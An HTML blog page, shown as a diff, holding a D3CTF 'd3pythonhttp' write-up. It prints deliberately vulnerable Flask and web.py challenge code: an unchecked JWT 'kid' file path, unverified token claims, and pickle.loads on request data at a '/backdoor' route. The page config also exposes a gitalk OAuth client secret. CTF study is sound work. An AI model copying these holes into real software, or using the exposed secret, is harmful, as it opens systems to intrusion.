@@ -1,0 +1,503 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="jerem1ah">
+    
+    <title>
+        
+            D3CTF_d3pythonhttp |
+        
+        Jerem1ah&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/images/imgs/50ac4ec68298791a5339fb793e82115.jpg">
+    
+<link rel="stylesheet" href="/fontawesome/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/css/regular.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/css/brands.min.css">
+
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066cc","logo":"/images/imgs/50ac4ec68298791a5339fb793e82115.jpg","favicon":"/images/imgs/50ac4ec68298791a5339fb793e82115.jpg","avatar":"/images/imgs/50ac4ec68298791a5339fb793e82115.jpg","font_size":null,"font_family":null,"hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"header_transparent":false,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving.","font_color":null,"hitokoto":false},"scroll":{"progress_bar":true,"percent":true}},"local_search":{"enable":false,"preload":false},"code_copy":{},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"side_tools":{},"pjax":{"enable":false},"lazyload":{"enable":false},"comment":{"enable":true,"use":"gitalk","valine":{"appid":null,"appkey":null,"placeholder":null},"gitalk":{"github_id":"Lejeremiah","github_admins":null,"repository":"gitalk","client_id":"a415960e8a19902e98bf","client_secret":"97151a67ce9c95ad3c333c402f4cee0f5f05020f"},"twikoo":{"env_id":null,"region":null,"version":"1.6.7"},"waline":{"server_url":null,"reaction":false,"version":2}},"post":{"author_label":{"enable":true,"auto":true,"custom_label_list":["Trainee","Engineer","Architect"]},"word_count":{"enable":false,"wordcount":false,"min2read":false},"img_align":"left","copyright_info":false},"version":"3.5.2"};
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"};
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+                <a class="logo-image" href="/">
+                    <img src="/images/imgs/50ac4ec68298791a5339fb793e82115.jpg">
+                </a>
+            
+            <a class="logo-title" href="/">
+               Jerem1ah&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                HOME
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/links"
+                            >
+                                LINKS
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                ARCHIVES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                ABOUT
+                            </a>
+                        </li>
+                    
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">HOME</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/links">LINKS</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">ARCHIVES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">ABOUT</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container">
+        <div class="article-content-container">
+
+            <div class="article-title">
+                <span class="title-hover-animation">D3CTF_d3pythonhttp</span>
+            </div>
+
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="/images/imgs/50ac4ec68298791a5339fb793e82115.jpg">
+                    </div>
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">jerem1ah</span>
+                            
+                                <span class="author-label">Lv4</span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            
+<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        
+            <i class="fa-regular fa-calendar-plus"></i>&nbsp;
+        
+        <span class="pc">2024-05-04 17:27:37</span>
+        <span class="mobile">2024-05-04 17:27</span>
+    </span>
+    
+        <span class="article-update-date article-meta-item">
+        <i class="fas fa-file-pen"></i>&nbsp;
+        <span class="pc">2024-05-04 17:30:04</span>
+    </span>
+    
+    
+    
+
+    
+    
+    
+    
+</div>
+
+                        </div>
+                    </div>
+                </div>
+            
+
+            <div class="article-content keep-markdown-body">
+                <h1 id="d3pythonhttp"><a href="#d3pythonhttp" class="headerlink" title="d3pythonhttp"></a>d3pythonhttp</h1><h3 id="d3参考"><a href="#d3参考" class="headerlink" title="d3参考"></a>d3参考</h3><p><a class="link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/AEF9469H7T_J9J3C3JvWvA" >https://mp.weixin.qq.com/s/AEF9469H7T_J9J3C3JvWvA<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://blog.wm-team.cn/index.php/archives/75/" >https://blog.wm-team.cn/index.php/archives/75/<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?srcid=0429KRSmkPyt4kmBPl5s657E&amp;scene=23&amp;sharer_shareinfo=cf93709293538b1626fda061b971ff8d&amp;mid=2247484107&amp;sn=46d493e9685702515b514325db8ebca0&amp;idx=1&amp;sharer_shareinfo_first=cf93709293538b1626fda061b971ff8d&amp;__biz=Mzg5OTUzNDY2Nw==&amp;chksm=c05098eff72711f979f1db15f2c22017383f8f3f5078b65c7ede96be75b11720a1a0cf3d401f&amp;mpshare=1#rd" >https://mp.weixin.qq.com/s?srcid=0429KRSmkPyt4kmBPl5s657E&amp;scene=23&amp;sharer_shareinfo=cf93709293538b1626fda061b971ff8d&amp;mid=2247484107&amp;sn=46d493e9685702515b514325db8ebca0&amp;idx=1&amp;sharer_shareinfo_first=cf93709293538b1626fda061b971ff8d&amp;__biz=Mzg5OTUzNDY2Nw%3D%3D&amp;chksm=c05098eff72711f979f1db15f2c22017383f8f3f5078b65c7ede96be75b11720a1a0cf3d401f&amp;mpshare=1#rd<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?srcid=0429zxrQpINGpV5EY7FJt612&amp;scene=23&amp;sharer_shareinfo=7041f7b46f6a257adeffd8ada20a6f91&amp;mid=2247484582&amp;sn=0e0856c0a01b5358dc7e7428a2855cfa&amp;idx=1&amp;sharer_shareinfo_first=7041f7b46f6a257adeffd8ada20a6f91&amp;__biz=MzkxNzU4OTM0MA==&amp;chksm=c1bf1895f6c891833a0f410059a793d2c7c28fe965240ca3a3393a30be99ef9b00f034b9f083&amp;mpshare=1#rd" >https://mp.weixin.qq.com/s?srcid=0429zxrQpINGpV5EY7FJt612&amp;scene=23&amp;sharer_shareinfo=7041f7b46f6a257adeffd8ada20a6f91&amp;mid=2247484582&amp;sn=0e0856c0a01b5358dc7e7428a2855cfa&amp;idx=1&amp;sharer_shareinfo_first=7041f7b46f6a257adeffd8ada20a6f91&amp;__biz=MzkxNzU4OTM0MA%3D%3D&amp;chksm=c1bf1895f6c891833a0f410059a793d2c7c28fe965240ca3a3393a30be99ef9b00f034b9f083&amp;mpshare=1#rd<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://ycznkvrmzo.feishu.cn/docx/LKTtdcWYIov9k1xCawgcGY0knFf" >https://ycznkvrmzo.feishu.cn/docx/LKTtdcWYIov9k1xCawgcGY0knFf<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/gnXiAfUlx80kZaaiRQfIow" >https://mp.weixin.qq.com/s/gnXiAfUlx80kZaaiRQfIow<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://blog.s1um4i.com/2024-D3CTF/#more" >https://blog.s1um4i.com/2024-D3CTF/#more<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?srcid=0430AkULY54BqatZLQw5nc1G&amp;scene=23&amp;sharer_shareinfo=5c5fe3b66cfb30c75f85681ecb3923c2&amp;mid=2247484634&amp;sn=f80392917739d8c0d036d27dfd0f0d4c&amp;idx=1&amp;sharer_shareinfo_first=5c5fe3b66cfb30c75f85681ecb3923c2&amp;__biz=MzkxNzU4OTM0MA==&amp;chksm=c1bf18e9f6c891ff4866f78746ea7c6e237b10d1e7ddee45bdcc9f654a5292da7336f0aaf8fb&amp;mpshare=1#rd" >https://mp.weixin.qq.com/s?srcid=0430AkULY54BqatZLQw5nc1G&amp;scene=23&amp;sharer_shareinfo=5c5fe3b66cfb30c75f85681ecb3923c2&amp;mid=2247484634&amp;sn=f80392917739d8c0d036d27dfd0f0d4c&amp;idx=1&amp;sharer_shareinfo_first=5c5fe3b66cfb30c75f85681ecb3923c2&amp;__biz=MzkxNzU4OTM0MA%3D%3D&amp;chksm=c1bf18e9f6c891ff4866f78746ea7c6e237b10d1e7ddee45bdcc9f654a5292da7336f0aaf8fb&amp;mpshare=1#rd<i class="fas fa-external-link-alt"></i></a></p>
+<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> python:<span class="number">3.10</span>-slim-bullseye</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> sed -i <span class="string">&#x27;s/deb.debian.org/mirrors.ustc.edu.cn/g&#x27;</span> /etc/apt/sources.list &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    sed -i <span class="string">&#x27;s/security.debian.org/mirrors.ustc.edu.cn/g&#x27;</span> /etc/apt/sources.list</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get update </span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> python3 -m pip install -i https://pypi.tuna.tsinghua.edu.cn/simple \</span></span><br><span class="line"><span class="language-bash">    flask PyJWT</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./src /app</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">8081</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> adduser ctf &amp;&amp; addgroup ctfgroup &amp;&amp; adduser ctf ctfgroup</span></span><br><span class="line"><span class="keyword">USER</span> ctf</span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;python3&quot;</span>, <span class="string">&quot;/app/app.py&quot;</span>]</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, redirect, render_template_string, make_response</span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> http.client</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">login_form = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;form method=&quot;post&quot;&gt;</span></span><br><span class="line"><span class="string">    Username: &lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">    Password: &lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;submit&quot; value=&quot;Login&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    token = request.cookies.get(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> token <span class="keyword">and</span> verify_token(token):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello &quot;</span> + jwt.decode(token, algorithms=[<span class="string">&quot;HS256&quot;</span>], options=&#123;<span class="string">&quot;verify_signature&quot;</span>: <span class="literal">False</span>&#125;)[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">    <span class="keyword">else</span>: </span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&quot;/login&quot;</span>, code=<span class="number">302</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        user_info = &#123;<span class="string">&quot;username&quot;</span>: request.form[<span class="string">&quot;username&quot;</span>], <span class="string">&quot;isadmin&quot;</span>: <span class="literal">False</span>&#125;</span><br><span class="line">        key = get_key(<span class="string">&quot;frontend_key&quot;</span>)</span><br><span class="line">        token = jwt.encode(user_info, key, algorithm=<span class="string">&quot;HS256&quot;</span>, headers=&#123;<span class="string">&quot;kid&quot;</span>: <span class="string">&quot;frontend_key&quot;</span>&#125;)</span><br><span class="line">        resp = make_response(redirect(<span class="string">&quot;/&quot;</span>, code=<span class="number">302</span>))</span><br><span class="line">        resp.set_cookie(<span class="string">&quot;token&quot;</span>, token)</span><br><span class="line">        <span class="keyword">return</span> resp</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template_string(login_form)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/backend&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proxy_to_backend</span>():</span><br><span class="line">    forward_url = <span class="string">&quot;python-backend:8080&quot;</span></span><br><span class="line">    conn = http.client.HTTPConnection(forward_url)</span><br><span class="line">    method = request.method</span><br><span class="line">    headers = &#123;key: value <span class="keyword">for</span> (key, value) <span class="keyword">in</span> request.headers <span class="keyword">if</span> key != <span class="string">&quot;Host&quot;</span>&#125;</span><br><span class="line">    data = request.data</span><br><span class="line">    path = <span class="string">&quot;/&quot;</span></span><br><span class="line">    <span class="keyword">if</span> request.query_string:</span><br><span class="line">        path += <span class="string">&quot;?&quot;</span> + request.query_string.decode()</span><br><span class="line">    conn.request(method, path, body=data, headers=headers)</span><br><span class="line">    response = conn.getresponse()</span><br><span class="line">    <span class="keyword">return</span> response.read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin</span>():</span><br><span class="line">    token = request.cookies.get(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> token <span class="keyword">and</span> verify_token(token):</span><br><span class="line">        <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> jwt.decode(token, algorithms=[<span class="string">&#x27;HS256&#x27;</span>], options=&#123;<span class="string">&quot;verify_signature&quot;</span>: <span class="literal">False</span>&#125;)[<span class="string">&#x27;isadmin&#x27;</span>]:</span><br><span class="line">                forward_url = <span class="string">&quot;python-backend:8080&quot;</span></span><br><span class="line">                conn = http.client.HTTPConnection(forward_url)</span><br><span class="line">                method = request.method</span><br><span class="line">                headers = &#123;key: value <span class="keyword">for</span> (key, value) <span class="keyword">in</span> request.headers <span class="keyword">if</span> key != <span class="string">&#x27;Host&#x27;</span>&#125;</span><br><span class="line">                data = request.data</span><br><span class="line">                path = <span class="string">&quot;/&quot;</span></span><br><span class="line">                <span class="keyword">if</span> request.query_string:</span><br><span class="line">                    path += <span class="string">&quot;?&quot;</span> + request.query_string.decode()</span><br><span class="line">                <span class="keyword">if</span> headers.get(<span class="string">&quot;Transfer-Encoding&quot;</span>, <span class="string">&quot;&quot;</span>).lower() == <span class="string">&quot;chunked&quot;</span>:</span><br><span class="line">                    data = <span class="string">&quot;&#123;&#125;\r\n&#123;&#125;\r\n0\r\n\r\n&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(data))[<span class="number">2</span>:], data.decode())</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;BackdoorPasswordOnlyForAdmin&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;You are not an admin!&quot;</span></span><br><span class="line">                conn.request(method, <span class="string">&quot;/backdoor&quot;</span>, body=data, headers=headers)</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Done!&quot;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;You are not an admin!&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> jwt.decode(token, algorithms=[<span class="string">&#x27;HS256&#x27;</span>], options=&#123;<span class="string">&quot;verify_signature&quot;</span>: <span class="literal">False</span>&#125;)[<span class="string">&#x27;isadmin&#x27;</span>]:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Welcome admin!&quot;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;You are not an admin!&quot;</span></span><br><span class="line">    <span class="keyword">else</span>: </span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&quot;/login&quot;</span>, code=<span class="number">302</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_key</span>(<span class="params">kid</span>):</span><br><span class="line">    key = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="built_in">dir</span> = <span class="string">&quot;/app/&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="built_in">dir</span>+kid, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            key = f.read()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="built_in">print</span>(key)</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify_token</span>(<span class="params">token</span>):</span><br><span class="line">    header = jwt.get_unverified_header(token)</span><br><span class="line">    kid = header[<span class="string">&quot;kid&quot;</span>]</span><br><span class="line">    key = get_key(kid)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = jwt.decode(token, key, algorithms=[<span class="string">&quot;HS256&quot;</span>])</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host = <span class="string">&quot;0.0.0.0&quot;</span>, port = <span class="number">8081</span>, debug=<span class="literal">False</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> python:<span class="number">3.10</span>-slim-bullseye</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> sed -i <span class="string">&#x27;s/deb.debian.org/mirrors.ustc.edu.cn/g&#x27;</span> /etc/apt/sources.list &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    sed -i <span class="string">&#x27;s/security.debian.org/mirrors.ustc.edu.cn/g&#x27;</span> /etc/apt/sources.list</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get update </span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> python3 -m pip install -i https://pypi.tuna.tsinghua.edu.cn/simple \</span></span><br><span class="line"><span class="language-bash">    web.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./src /app</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">8080</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> adduser ctf &amp;&amp; addgroup ctfgroup &amp;&amp; adduser ctf ctfgroup</span></span><br><span class="line"><span class="keyword">USER</span> ctf</span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;python3&quot;</span>, <span class="string">&quot;/app/app.py&quot;</span>]</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> web</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">urls = (</span><br><span class="line">    <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;index&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/backdoor&#x27;</span>, <span class="string">&#x27;backdoor&#x27;</span></span><br><span class="line">)</span><br><span class="line">web.config.debug = <span class="literal">False</span></span><br><span class="line">app = web.application(urls, <span class="built_in">globals</span>())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">index</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">GET</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;welcome to the backend!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">backdoor</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">POST</span>(<span class="params">self</span>):</span><br><span class="line">        data = web.data()</span><br><span class="line">        <span class="comment"># fix this backdoor</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;BackdoorPasswordOnlyForAdmin&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;You are an admin!&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            data  = base64.b64decode(data)</span><br><span class="line">            pickle.loads(data)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Done!&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<blockquote>
+<p>Transfer-Encoding is an HTTP header that specifies the form of encoding used to safely transfer the payload body in a request or response message. It informs the recipient how the message body has been encoded, allowing them to decode it properly.</p>
+<p>There are several common Transfer-Encoding values:</p>
+<ol>
+<li><strong>chunked</strong>: This means the body of the message is divided into a series of chunks. Each chunk is sent separately, preceded by its size in bytes. Chunked encoding allows the sender to send a response without knowing the total size in advance, which can be useful for streaming or large responses.</li>
+<li><strong>identity</strong>: This indicates that no encoding has been applied to the body, and the message is sent as-is.</li>
+<li><strong>gzip</strong>: This indicates that the body has been compressed using gzip compression.</li>
+<li><strong>deflate</strong>: This indicates that the body has been compressed using the deflate algorithm.</li>
+</ol>
+<p>When a client sends a request with a Transfer-Encoding header, it tells the server how to decode the body of the request. Similarly, when a server sends a response with a Transfer-Encoding header, it informs the client how to decode the body of the response.</p>
+</blockquote>
